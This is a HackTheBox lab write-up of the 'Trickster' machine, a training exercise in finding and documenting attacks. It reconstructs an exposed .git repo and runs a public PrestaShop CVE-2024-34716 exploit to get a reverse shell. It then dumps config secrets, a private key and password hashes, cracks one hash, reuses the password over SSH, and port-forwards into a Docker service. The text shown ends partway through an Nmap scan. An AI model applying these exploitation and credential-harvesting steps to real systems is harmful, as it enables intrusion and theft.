---
title: "Trickster - HTB Writeup"
header: 
  teaser: /assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-HTB-Image.png
  header: /assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-HTB-Image.png
  og_image: /assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-HTB-Image.png
excerpt: "Trickster is a medium level box that involves web exploitation and unnecessary deployment artifacts in the form of Git repository hidden files in the web root. From there source code is revealed allowing the attacker to access a hidden admin panel which leads to exploitation of PrestaShop with CVE-2024-34716."
tags: [htb, writeup, trickster]
---
## Trickster - High Level Summary

[Trickster](https://app.hackthebox.com/machines/Trickster) is a medium level box that involves web exploitation and unnecessary deployment artifacts in the form of Git repository hidden files in the web root. From there source code is revealed allowing the attacker to access a hidden admin panel which leads to exploitation of PrestaShop with CVE-2024-34716. Database enumeration shows a reused password for user authentication via SSH. Locally accessible service enumeration reveals a Docker container hosting Changedetection.io version 0.45.20 which allows for password reuse once again. Exploitation of a server side template vulnerability returns a root shell for the Docker container and an interesting datastore directory has sensitive backup files containing user secrets for the Adam user. The Adam user is able to execute PrusaSlicer version 2.6.1 on the target machine with root level permissions. CVE-2023-47268 is used to gain root permissions over the target machine.

### Recommendations

- Insecure Git Artifacts in Web Root - Git repository artifacts are in the web server's root and accessible to all users on the network. CI/CD processes should eliminate these types of files from the environment.
- CVE-2024-34716 - PrestaShop vulnerable version is being ran. Patch management must be reviewed to track vulnerable versions going forward.
- Password Reuse - Two instances of password reuse allowed for lateral movement on the box. Password policies should be enforced and the client should look into secrets management systems.
- CVE-2024-32651 - Server side template injection in vulnerable version of Changedetection.io version 0.45.20. This will also be tracked in a formal vulnerability management program.
- CVE-2023-47268 - Arbitrary code execution as root was achieved due to sudo misconfiguration and an old version of PrusaSlicer being ran. Version tracking in a vulnerability management program would've taken care of this, but the client should also re-evaluate permissions management as this was not something that needed to be ran by root.

## Trickster - Methodologies

### Information Gathering - Nmap Port Scan

An Nmap port scan is performed against the target IP in order to identify services that are running on the target machine and available to the local environment. It looks like two ports are open on the target machine. Port 22 is used to host SSH for remote management of the box. Port 80 is an HTTP web service running using Apache 2.4.52. Default service enumeration scripts show that OpenSSH 8.9p1 is running on Ubuntu server, confirming that this is a Linux target.

```shell
# Nmap 7.94SVN scan initiated Fri Nov 29 19:32:36 2024 as: /usr/lib/nmap/nmap -p- -Pn -A -O -sV -sC -oN nmap.all 10.10.11.34
Nmap scan report for 10.10.11.34
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://trickster.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/29%OT=22%CT=1%CU=40434%PV=Y%DS=2%DC=T%G=Y%TM=674
OS:A5DBA%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A
OS:)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10B%T
OS:I=Z%CI=Z%II=I%TS=D)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=
OS:M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE
OS:88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%
OS:DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A
OS:=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=
OS:G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   63.86 ms 10.10.14.1
2   63.97 ms 10.10.11.34

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov 29 19:35:06 2024 -- 1 IP address (1 host up) scanned in 150.47 seconds
```

### Information Gathering - Web Service

Upon visiting the web service on port 80 we are redirected to the hostname `trickster.htb` which is added to our `/etc/hosts` file in order to allow the attacking machine to resolve this domain name. We are greated with a fairly basic web page with tiles for various pieces of content. This appears to be an entirely static website and not much is here for enumeration or exploitation. One button, the 'SHOP' button, is a link to another site in a hidden subdomain of the target: `shop.trickster.htb`.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241129202924.png)

## Service Enumeration - Shop Subdomain

Once the shop domain has been added to `/etc/hosts` we can access the shop page which appears to be running an off the shelf solution called PrestaShop. Most of the data on the site is sample/template data so it does not appear that there is any further information in the product pages that come after.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241129202950.png)

A `robots.txt` page is found with some basic enumeration. It appears that there is an extensive list of disallowed sites and most of the sites allowed are in the modules subdirectory. This file also confirms that the shop is running on PrestaShop and it provides a link to the website to download it. 

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241129203004.png)

With a bit more web enumeration (guessing common files and directories) we identify a `.git` directory on the web root. This can be somewhat common since the web root is often just a deployment of the production branch for a given Git project. It looks like the web master forgot to remove this  unintended artifact, but the git directory is fairly sensitive since it could lead the source code disclosure.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241129203016.png)

When a PrestaShop instance is deployed, a completely random link is created for the admin panel in order to make it more difficult to locate/attack. When diving down the logs directory of the git repo we can see the commit for updating the admin panel by the Adam user. This discloses the admin panel link to us unintentionally.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241129214009.png)

Frankly, there is a ton of information in this git repo to sort through so we can use wget to download it all locally and sift through it there:

```shell
wget -r -np -R "index.html*" -e robots=off http://shop.trickster.htb/.git/
```

Using the git client, we can actually restore a portion of the repo from the metadata that was downloaded using wget.

```shell
┌──(kali㉿kali)-[~/Hacking/Trickster/shop.trickster.htb]
└─$ git restore *
                                                                                                                    
┌──(kali㉿kali)-[~/Hacking/Trickster/shop.trickster.htb]
└─$ ls
admin634ewutrx1jgitlooaj  error500.html  init.php                 INSTALL.txt  Makefile
autoload.php              index.php      Install_PrestaShop.html  LICENSES
```

Using the name of the admin634wutrx1jgitlooaj endpoint, we can get to the admin panel and reveal version information about Prestashop.

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241129215633.png)

### CVE-2024-34716 - PrestaShop <=8.1.5 Cross-site Scripting to RCE

This step took forever to finally locate. Luckily I was able to find another [blog post](https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/) to help work through this exploitation process. It looks like the exploit relies on a cross site scripting attack against the contact form through a PNG upload. Essentially, through PNG upload an attacker can cause a site administrator to execute code upon viewing their request. This code could be easily written to pass the administrator's cookie to a malicious actor but it doesn't stop there. 

Themes are PHP based packages that can be installed to customize the entire look and function of these types of sites. With code execution as an administrative user we can have the administrator remotely load and execute a theme on their website. The main function of a theme is to use PHP code, that runs completely server side, in order to further customize the website. The exploit in this chain is the fact that we can XSS an admin to remote load our theme and execute a reverse shell on the target web server if done correctly.

Luckily this blog post also comes with a PoC Github repo that will allow us to automate the entire exploit chain. 

<https://github.com/aelmokhtar/CVE-2024-34716>

We can start but cloning down the repo and starting a simple HTTP server with Python in order to serve any files in the current directroy to the local network via web service.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ git clone https://github.com/aelmokhtar/CVE-2024-34716.git
Cloning into 'CVE-2024-34716'...
remote: Enumerating objects: 60, done.
remote: Counting objects: 100% (60/60), done.
remote: Compressing objects: 100% (42/42), done.
remote: Total 60 (delta 30), reused 34 (delta 13), pack-reused 0 (from 0)
Receiving objects: 100% (60/60), 6.71 MiB | 266.00 KiB/s, done.
Resolving deltas: 100% (30/30), done.
                                                                                                                    
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ cd CVE-2024-34716 
                                                                                                                    
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/CVE-2024-34716]
└─$ ls
exploit.html  ps_next_8_theme_malicious_old.zip  requirements.txt
exploit.py    README.md                          reverse_shell_template.php
                                                                                                                    
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/CVE-2024-34716]
└─$ sudo python3 -m http.server 4000                                                     
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 4000 (http://0.0.0.0:4000/) ...
```

The attacking system must be prepped with Python's pip package manager, which can be easily satisfied with the `requirements.txt` file provided in the Git repo. We also need to make sure that Ncat is installed.

```shell
pip3 install -r requirements.txt --break-system-packages
sudo apt install ncat -y
```

Now we can run the exploit. Be sure to register an account on the site so that the provided email in the exploitation command is a valid address. Also be sure to substitute the `--local-ip` parameter with your own local IP address. The following path shows the exploitation steps completed in order to gain a remote shell on the target machine.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/CVE-2024-34716]
└─$ python3 exploit.py --url 'http://shop.trickster.htb' --email 'test@gmail.com' --local-ip 10.10.14.6 --admin-path 'admin634ewutrx1jgitlooaj'
[X] Starting exploit with:
        Url: http://shop.trickster.htb
        Email: test@gmail.com
        Local IP: 10.10.14.6
        Admin Path: admin634ewutrx1jgitlooaj
[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.
Serving at http.Server on port 5000
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:12345
Ncat: Listening on 0.0.0.0:12345
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
GET request to http://shop.trickster.htb/themes/next/reverse_shell_new.php: 403
Request: GET /ps_next_8_theme_malicious.zip HTTP/1.1
Response: 200 -
10.10.11.34 - - [29/Nov/2024 23:32:21] "GET /ps_next_8_theme_malicious.zip HTTP/1.1" 200 -
Ncat: Connection from 10.10.11.34:53250.
Linux trickster 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 04:32:34 up  4:02,  0 users,  load average: 0.07, 0.12, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```

With a www-data shell we can perform a simple shell upgrade in order to gain full functionality of the reverse shell. This will allow us to use tab auto-completion and history.

```shell
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@trickster:/$ 

www-data@trickster:/$ 

www-data@trickster:/$ export TERM=xterm-256color
export TERM=xterm-256color
www-data@trickster:/$ bash
bash
www-data@trickster:/$ ^Z
zsh: suspended  python3 exploit.py --url 'http://shop.trickster.htb' --email 'test@gmail.com'
                                                                                                                    
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/CVE-2024-34716]
└─$ stty raw -echo;fg                     
[1]  + continued  python3 exploit.py --url 'http://shop.trickster.htb' --email 'test@gmail.com'

www-data@trickster:/$ 
```

With some basic enumeration of the available directories, we can find a `parameters.php` file inside of the app directory for the web service. This is a PHP file used to store credentails and parameters for this specific PrestaShop instance. One of the important credentials in this file is the database connection which is hosted locally. We can see the credentials: `ps_user:prest@shop_o`

```shell
www-data@trickster:~/prestashop/app/config$ cat parameters.php 
<?php return array (
  'parameters' => 
  array (
    'database_host' => '127.0.0.1',
    'database_port' => '',
    'database_name' => 'prestashop',
    'database_user' => 'ps_user',
    'database_password' => 'prest@shop_o',
    'database_prefix' => 'ps_',
    'database_engine' => 'InnoDB',
    'mailer_transport' => 'smtp',
    'mailer_host' => '127.0.0.1',
    'mailer_user' => NULL,
    'mailer_password' => NULL,
    'secret' => 'eHPDO7bBZPjXWbv3oSLIpkn5XxPvcvzt7ibaHTgWhTBM3e7S9kbeB1TPemtIgzog',
    'ps_caching' => 'CacheMemcache',
    'ps_cache_enable' => false,
    'ps_creation_date' => '2024-05-25',
    'locale' => 'en-US',
    'use_debug_toolbar' => true,
    'cookie_key' => '8PR6s1SJZLPCjXTegH7fXttSAXbG2h6wfCD3cLk5GpvkGAZ4K9hMXpxBxrf7s42i',
    'cookie_iv' => 'fQoIWUoOLU0hiM2VmI1KPY61DtUsUx8g',
    'new_cookie_key' => 'def000001a30bb7f2f22b0a7790f2268f8c634898e0e1d32444c3a03f4040bd5e8cb44bdb57a73f70e01cf83a38ec5d2ddc1741476e83c45f97f763e7491cc5e002aff47',
    'api_public_key' => '-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuSFQP3xrZccKbS/VGKMr
v8dF4IJh9F9NvmPZqiFNpJnBHhfWE3YVM/OrEREGKztkHFsQGUZXFIwiBQVs5kAG
5jfw+hQrl89+JRD0ogZ+OHUfN/CgmM2eq1H/gxAYfcRfwjSlOh2YzAwpLvwtYXBt
Scu6QqRAdotokqW2m3aMt+LV8ERdFsBkj+/OVdJ8oslvSt6Kgf39DnBpGIXAqaFc
QdMdq+1lT9oiby0exyUkl6aJU21STFZ7kCf0Secp2f9NoaKoBwC9m707C2UCNkAm
B2A2wxf88BDC7CtwazwDW9QXdF987RUzGj9UrEWwTwYEcJcV/hNB473bcytaJvY1
ZQIDAQAB
-----END PUBLIC KEY-----
',
    'api_private_key' => '-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC5IVA/fGtlxwpt
L9UYoyu/x0XggmH0X02+Y9mqIU2kmcEeF9YTdhUz86sREQYrO2QcWxAZRlcUjCIF
BWzmQAbmN/D6FCuXz34lEPSiBn44dR838KCYzZ6rUf+DEBh9xF/CNKU6HZjMDCku
/C1hcG1Jy7pCpEB2i2iSpbabdoy34tXwRF0WwGSP785V0nyiyW9K3oqB/f0OcGkY
hcCpoVxB0x2r7WVP2iJvLR7HJSSXpolTbVJMVnuQJ/RJ5ynZ/02hoqgHAL2bvTsL
ZQI2QCYHYDbDF/zwEMLsK3BrPANb1Bd0X3ztFTMaP1SsRbBPBgRwlxX+E0Hjvdtz
K1om9jVlAgMBAAECggEAD5CTdKL7TJVNdRyeZ/HgDcGtSFDt92PD34v5kuo14u7i
Y6tRXlWBNtr3uPmbcSsPIasuUVGupJWbjpyEKV+ctOJjKkNj3uGdE3S3fJ/bINgI
BeX/OpmfC3xbZSOHS5ulCWjvs1EltZIYLFEbZ6PSLHAqesvgd5cE9b9k+PEgp50Q
DivaH4PxfI7IKLlcWiq2mBrYwsWHIlcaN0Ys7h0RYn7OjhrPr8V/LyJLIlapBeQV
Geq6MswRO6OXfLs4Rzuw17S9nQ0PDi4OqsG6I2tm4Puq4kB5CzqQ8WfsMiz6zFU/
UIHnnv9jrqfHGYoq9g5rQWKyjxMTlKA8PnMiKzssiQKBgQDeamSzzG6fdtSlK8zC
TXHpssVQjbw9aIQYX6YaiApvsi8a6V5E8IesHqDnS+s+9vjrHew4rZ6Uy0uV9p2P
MAi3gd1Gl9mBQd36Dp53AWik29cxKPdvj92ZBiygtRgTyxWHQ7E6WwxeNUWwMR/i
4XoaSFyWK7v5Aoa59ECduzJm1wKBgQDVFaDVFgBS36r4fvmw4JUYAEo/u6do3Xq9
JQRALrEO9mdIsBjYs9N8gte/9FAijxCIprDzFFhgUxYFSoUexyRkt7fAsFpuSRgs
+Ksu4bKxkIQaa5pn2WNh1rdHq06KryC0iLbNii6eiHMyIDYKX9KpByaGDtmfrsRs
uxD9umhKIwKBgECAXl/+Q36feZ/FCga3ave5TpvD3vl4HAbthkBff5dQ93Q4hYw8
rTvvTf6F9900xo95CA6P21OPeYYuFRd3eK+vS7qzQvLHZValcrNUh0J4NvocxVVn
RX6hWcPpgOgMl1u49+bSjM2taV5lgLfNaBnDLoamfEcEwomfGjYkGcPVAoGBAILy
1rL84VgMslIiHipP6fAlBXwjQ19TdMFWRUV4LEFotdJavfo2kMpc0l/ZsYF7cAq6
fdX0c9dGWCsKP8LJWRk4OgmFlx1deCjy7KhT9W/fwv9Fj08wrj2LKXk20n6x3yRz
O/wWZk3wxvJQD0XS23Aav9b0u1LBoV68m1WCP+MHAoGBANwjGWnrY6TexCRzKdOQ
K/cEIFYczJn7IB/zbB1SEC19vRT5ps89Z25BOu/hCVRhVg9bb5QslLSGNPlmuEpo
HfSWR+q1UdaEfABY59ZsFSuhbqvC5gvRZVQ55bPLuja5mc/VvPIGT/BGY7lAdEbK
6SMIa53I2hJz4IMK4vc2Ssqq
-----END PRIVATE KEY-----
',
  ),
);www-data@trickster:~/prestashop/app/config$ 
```

### Database Enumeration

With these credentials in hand we can enumerate the MariaDB that is hosted locally using the already installed command line client. A few  basic commands can show us the databases and tables that are in use on the database.

```shell
www-data@trickster:~/prestashop/app/config$ mysql -u ps_user -h 127.0.0.1 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11592
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| prestashop         |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use prestashop
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [prestashop]> show tables;
+-------------------------------------------------+
| Tables_in_prestashop                            |
+-------------------------------------------------+
| ps_access                                       |
| ps_accessory                                    |
| ps_address                                      |
| ps_address_format                               |
| ps_admin_filter                                 |
### SNIP ###
```

Further investigation of the `ps_employee` table shows that there are two administrators registered as employees for the PrestaShop instance. By dumping this table we can see the usernames, emails, and password hashes for these employee users. Password hashes are definitely sensitive data as we can attempt to crack these through offline methods.

```shell
MariaDB [prestashop]> select * from ps_employee;
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
| id_employee | id_profile | id_lang | lastname | firstname | email               | passwd                                                       | last_passwd_gen     | stats_date_from | stats_date_to | stats_compare_from | stats_compare_to | stats_compare_option | preselect_date_range | bo_color | bo_theme | bo_css    | default_tab | bo_width | bo_menu | active | optin | id_last_order | id_last_customer_message | id_last_customer | last_connection_date | reset_password_token | reset_password_validity | has_enabled_gravatar |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
|           1 |          1 |       1 | Store    | Trickster | admin@trickster.htb | $2y$10$P8wO3jruKKpvKRgWP6o7o.rojbDoABG9StPUt0dR7LIeK26RdlB/C | 2024-05-25 13:10:20 | 2024-04-25      | 2024-05-25    | 0000-00-00         | 0000-00-00       |                    1 | NULL                 | NULL     | default  | theme.css |           1 |        0 |       1 |      1 |  NULL |             5 |                        0 |                0 | 2024-11-30           | NULL                 | 0000-00-00 00:00:00     |                    0 |
|           2 |          2 |       0 | james    | james     | james@trickster.htb | $2a$04$rgBYAsSHUVK3RZKfwbYY9OPJyBbt/OzGw9UHi4UnlK6yG5LyunCmm | 2024-09-09 13:22:42 | NULL            | NULL          | NULL               | NULL             |                    1 | NULL                 | NULL     | NULL     | NULL      |           0 |        0 |       1 |      0 |  NULL |             0 |                        0 |                0 | NULL                 | NULL                 | NULL                    |                    0 |
+-------------+------------+---------+----------+-----------+---------------------+--------------------------------------------------------------+---------------------+-----------------+---------------+--------------------+------------------+----------------------+----------------------+----------+----------+-----------+-------------+----------+---------+--------+-------+---------------+--------------------------+------------------+----------------------+----------------------+-------------------------+----------------------+
2 rows in set (0.000 sec)

MariaDB [prestashop]> 
```

### Cracking Web Admin Password Hashes

After putting these password hashes into an offline file on the attacking machine, we can use [John the Ripper](https://www.openwall.com/john/) in order to crack these hashes against a password database. The rockyou database is chosen since it is the best all around database for use on these types of services. After a short time, the following credentials are returned:

`james:alwaysandforever`

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130000052.png)

## User Shell Access as James

With the previous credentials in hand, we can SSH into the target machine as the James user. It appears that James has reused their password on both the web service as well as the OS authentication for SSH. This access also allows us to read the user.txt flag.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster/CVE-2024-34716]
└─$ ssh james@trickster.htb        
The authenticity of host 'trickster.htb (10.10.11.34)' can't be established.
ED25519 key fingerprint is SHA256:SZyh4Oq8EYrDd5T2R0ThbtNWVAlQWg+Gp7XwsR6zq7o.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:5: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'trickster.htb' (ED25519) to the list of known hosts.
james@trickster.htb's password: 
Last login: Thu Sep 26 11:13:01 2024 from 10.10.14.41
james@trickster:~$ whoami
james
james@trickster:~$ ls
user.txt
james@trickster:~$ cat user.txt
dbe603b2b77ec8efb004f75b2c45950c
james@trickster:~$ 
```

### PrusaSlicer found in /opt

With some basic enumeration as the James user we can find an additional program installed in `/opt`. It looks like they have installed [PrusaSlicer](https://github.com/prusa3d/PrusaSlicer) on the target machine. Our user even has permissions to execute the tool. There is an exploit available for this version, but it is only going to be useful if we had permissions to run the tool as another user. 

<https://www.exploit-db.com/exploits/51983>

```shell
james@trickster:/opt/PrusaSlicer$ ls
prusaslicer  TRICKSTER.3mf
james@trickster:/opt/PrusaSlicer$ ./prusaslicer 
DISPLAY not set, GUI mode not available.

PrusaSlicer-2.6.1+linux-x64-GTK2-202309060801 based on Slic3r (with GUI support)
https://github.com/prusa3d/PrusaSlicer

Usage: prusa-slicer [ ACTIONS ] [ TRANSFORM ] [ OPTIONS ] [ file.stl ... ]
```

### Docker Enumeration

There appears to be a third interface on the device labeled docker0 which indicates that there might be container based applications also running on this server. While we can  poke around the OS to try to identify services, there might be a virtualized network hosted that we would like to scan. While Nmap isn't installed on the target machine we can download a [pre-compiled static binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) and upload it to the target for use.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ scp ~/Downloads/nmap james@trickster:~
james@trickster's password: 
nmap                                                                              100% 5805KB   8.0MB/s   00:00    
```

![Screenshot](/assets/images/2025-02-26-Trickster-HTB-Writeup/Trickster-Writeup-HTB20241130010902.png)

We can scan the entire 172.17.0.1/16 subnet to identify Docker containers that are accessible on the target machine. Nmap is able to identify a container on 172.17.0.2. That container only has one port accessible to the network, TCP port 5000.

```shell
james@trickster:/var/lib$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:ed:3a brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.34/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:3c:6c:22:23 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
39: veth904ca0e@if38: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether 06:37:52:6c:7e:e0 brd ff:ff:ff:ff:ff:ff link-netnsid 0
james@trickster:/var/lib$ cd
james@trickster:~$ ls
nmap  TRICKSTER.3mf  TRICKSTER.gcode  user.txt
james@trickster:~$ chmod +x nmap 
james@trickster:~$ ./nmap -sn 172.17.0.1/16

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-11-30 06:13 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.1
Host is up (0.00092s latency).
Nmap scan report for 172.17.0.2
Host is up (0.00050s latency).

james@trickster:~$ ./nmap -p- -Pn -oN nmap.out 172.17.0.2

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-11-30 06:17 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.17.0.2
Host is up (0.00038s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
5000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 41.80 seconds
```

### Port Forward Container Service to Attacker Host

We can use a simple SSH command to port forward our localhost port 5000 to the remote target's port 5000 against IP 172.17.0.2 to make it easily accessible to the attacking machine.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ ssh -L 5000:172.17.0.2:5000 james@trickster
james@trickster's password: 
Last login: Sat Nov 30 06:20:48 2024 from 10.10.14.6
james@trickster:~$ 
```

## Changedetection.io Web Service Enumeration

Once the port is locally accessible the attacking machine can scan it in more detail with Nmap and run default scripts and version enumeration. It looks like the service on port 5000 is running an HTTP server with an immediate redirect to a login page. Not much is enumerated about the service itself.

```shell
┌──(kali㉿kali)-[~/Hacking/HTB/Trickster]
└─$ sudo nmap -p 5000 -sV -sC -oN nmap.port5000 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-30 01:24 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000055s latency).

PORT     STATE SERVICE VERSION
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 213
|     Location: /login?next=/
|     Vary: Accept-Encoding, Cookie
|     Access-Control-Allow-Origin: *
|     Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZXJyb3IiLCJZb3UgbXVzdCBiZSBsb2dnZWQgaW4sIHBsZWFzZSBsb2cgaW4uIl19XX0.Z0qvkQ.w0tZJTBPFnyGcvNuYntA8BcJLXU; HttpOnly; Path=/
|     Date: Sat, 30 Nov 2024 06:24:17 GMT
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login?next=/">/login?next=/</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, OPTIONS, HEAD
|     Vary: Accept-Encoding
|     Access-Control-Allow-Origin: *
|     Content-Length: 0
|     Date: Sat, 30 Nov 2024 06:24:32 GMT
|     Connection: close
|   Help: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=11/30%Time=674AAF8F%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,262,"HTTP/1\.1\x20302\x20FOUND\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x20213\r\nLocation:\x20/login\?
